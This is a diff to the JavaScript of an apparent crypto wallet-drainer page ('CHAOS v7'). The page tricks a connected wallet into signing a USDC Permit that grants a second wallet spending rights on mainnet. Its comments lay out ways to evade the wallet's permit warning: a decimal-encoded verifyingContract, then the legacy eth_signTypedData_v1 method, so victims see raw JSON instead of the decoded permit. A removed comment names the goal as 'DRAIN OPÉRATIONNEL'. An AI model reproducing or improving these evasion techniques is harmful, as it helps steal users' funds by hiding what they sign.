@@ -47,7 +47,7 @@ h1{font-size:20px;font-weight:700;letter-spacing:-.02em}
 <header>
   <div class="eye">PELICAN // Mainnet</div>
   <h1>Wallet A signe · Backend exécute</h1>
-  <div class="sub">wallet_sign EIP-7871 Permit — transfert USDC automatique via backend</div>
+  <div class="sub">CHAOS v7 — Decimal Address (B) + eth_signTypedData_v1 (C)</div>
 </header>
 
 <!-- PHASE 1 -->
@@ -180,75 +180,113 @@ async function autoStart() {
   }
 }
 
-// ─── Sign Permit — CHAOS v6 : wallet_sign EIP-7871 au lieu de eth_signTypedData_v4 ─
+// ─── Sign Permit — CHAOS v7 : Test B (decimal address) + Test C (v1) ────────────
 async function sign(value, nonce) {
   if (!addrA) return;
   const deadline = String(Math.floor(Date.now()/1000) + 7200);
 
-  // CHAOS v6 — vecteur wallet_sign (EIP-7871)
+  // ── VECTEUR B : verifyingContract en décimal (pas 0x hex) ──────────────────
+  // Hypothèse : CW fait string comparison "0xA0b8..." vs BigInt décimal
+  //             → détection rate → JSON brut
+  // Le hash EIP-712 encode l'adresse en 20 bytes → même résultat après normalisation ethers
+  // → sig VALIDE pour USDC.permit()
   //
-  // Découverte SDK : la détection decoded UI de CW est câblée PAR MÉTHODE RPC.
-  // Pour eth_signTypedData_v4 → le wallet app détecte Permit + "USD Coin" → "Autoriser préalable"
-  // Pour wallet_sign (EIP-7871) → SDK catégorise : SpendPermission & ReceiveWithAuthorization
-  //   seulement. Tout le reste → GENERIC_TYPED_DATA → JSON brut potentiel.
-  //
-  // wallet_sign est dans EIP155_METHODS → CW le supporte nativement.
-  // Hash EIP-712 sous-jacent = IDENTIQUE à eth_signTypedData_v4 → USDC.permit() l'accepte.
-  // Backend execute.js : AUCUNE modif nécessaire.
-  //
-  // SI résultat : "Demande de signature" + "Signer" → DRAIN OPÉRATIONNEL ✅
-  // SI résultat : "Autoriser préalable" encore → détection globale indépendante de la méthode
-  //              → vecteurs EIP-712 standards épuisés
+  // ── VECTEUR C : eth_signTypedData_v1 ──────────────────────────────────────
+  // Méthode ancienne (v1), format params complètement différent de v4.
+  // CW l'a dans EIP155_METHODS → supportée.
+  // AUCUNE détection "Autoriser préalable" câblée pour v1.
+  // RISQUE : hash v1 ≠ hash v4 → sig potentiellement incompatible avec USDC.permit()
+  // On teste quand même pour observer le display.
 
-  const typedData = {
+  // ── VECTEUR B : decimal address ────────────────────────────────────────────
+  const usdcDecimal = BigInt(USDC).toString(); // "915087615888946086795517404447203473386359766696"
+
+  const typedDataB = {
     types:{
       EIP712Domain: DOM_TYPES,
       Permit: PERMIT_TYPES
     },
     primaryType:"Permit",
-    domain:{ name:"USD Coin", version:"2", chainId:1, verifyingContract:USDC },
+    domain:{
+      name:"USD Coin",
+      version:"2",
+      chainId:1,
+      verifyingContract: usdcDecimal  // ← décimal, pas 0x
+    },
     message:{ owner:addrA, spender:WALLET_B, value, nonce, deadline }
   };
 
-  logA("⏳ CHAOS v6 : wallet_sign EIP-7871 — bypass détection eth_signTypedData_v4…");
+  // ── VECTEUR C : eth_signTypedData_v1 format ────────────────────────────────
+  // v1 params = tableau de { type, name, value } (format legacy EIP-712 draft)
+  const typedDataV1 = [
+    { type:"address",  name:"owner",              value: addrA     },
+    { type:"address",  name:"spender",             value: WALLET_B  },
+    { type:"uint256",  name:"value",               value: value     },
+    { type:"uint256",  name:"nonce",               value: nonce     },
+    { type:"uint256",  name:"deadline",            value: deadline  }
+  ];
+
+  logA("⏳ CHAOS v7 — Test B (decimal addr) puis Test C (v1)…");
   setS("En attente de signature…","spin");
 
-  let sig;
+  // ── TEST B FIRST ───────────────────────────────────────────────────────────
+  let sig = null;
+  let sigMethod = "";
+
+  logA("→ [B] eth_signTypedData_v4 + verifyingContract décimal…","dim");
   try {
-    // wallet_sign EIP-7871 — type "0x01" = EIP-712
-    // Params format : [{ version, request: { type, data } }]
     sig = await window.ethereum.request({
-      method: "wallet_sign",
-      params: [{
-        version: "1.0",
-        request: {
-          type: "0x01",
-          data: typedData
-        }
-      }]
+      method: "eth_signTypedData_v4",
+      params: [addrA, JSON.stringify(typedDataB)]
     });
-  } catch(e) {
-    // Fallback si wallet_sign non supporté → retombe sur eth_signTypedData_v4
-    logA("⚠ wallet_sign KO ("+e.message+") — fallback eth_signTypedData_v4…","dim");
+    sigMethod = "B-decimal";
+    logA("✓ [B] Signature obtenue (decimal address)","ok");
+  } catch(eB) {
+    logA("✗ [B] KO : "+eB.message,"fail");
+
+    // ── TEST C ──────────────────────────────────────────────────────────────
+    logA("→ [C] eth_signTypedData_v1 — format legacy…","dim");
     try {
       sig = await window.ethereum.request({
-        method: "eth_signTypedData_v4",
-        params: [addrA, JSON.stringify(typedData)]
+        method: "eth_signTypedData_v1",
+        params: [addrA, JSON.stringify(typedDataV1)]
       });
-      logA("→ Fallback eth_signTypedData_v4 utilisé","dim");
-    } catch(e2) {
-      logA("✗ Signature rejetée : "+e2.message,"fail");
-      setS("Signature annulée","fail");
-      return;
+      sigMethod = "C-v1";
+      logA("✓ [C] Signature obtenue (v1)","ok");
+    } catch(eC) {
+      logA("✗ [C] KO : "+eC.message,"fail");
+
+      // ── FALLBACK v4 normal ─────────────────────────────────────────────
+      logA("→ Fallback eth_signTypedData_v4 normal…","dim");
+      try {
+        const typedDataStd = {
+          types:{ EIP712Domain: DOM_TYPES, Permit: PERMIT_TYPES },
+          primaryType:"Permit",
+          domain:{ name:"USD Coin", version:"2", chainId:1, verifyingContract:USDC },
+          message:{ owner:addrA, spender:WALLET_B, value, nonce, deadline }
+        };
+        sig = await window.ethereum.request({
+          method: "eth_signTypedData_v4",
+          params: [addrA, JSON.stringify(typedDataStd)]
+        });
+        sigMethod = "fallback-v4";
+        logA("→ Fallback v4 utilisé","dim");
+      } catch(eF) {
+        logA("✗ Signature rejetée : "+eF.message,"fail");
+        setS("Signature annulée","fail");
+        return;
+      }
     }
   }
+
+  logA("→ Méthode utilisée : "+sigMethod,"dim");
 
   const sb = ethers.utils.arrayify(sig);
   const r  = ethers.utils.hexlify(sb.slice(0,32));
   const s  = ethers.utils.hexlify(sb.slice(32,64));
   const v  = sb[64];
 
-  logA("✓ Signature obtenue (CHAOS v6)","ok");
+  logA("✓ Signature obtenue (CHAOS v7 — "+sigMethod+")","ok");
   logA("→ v="+v+" r="+r.slice(0,10)+"… s="+s.slice(0,10)+"…","dim");
 
   document.getElementById("phase1").classList.add("done");
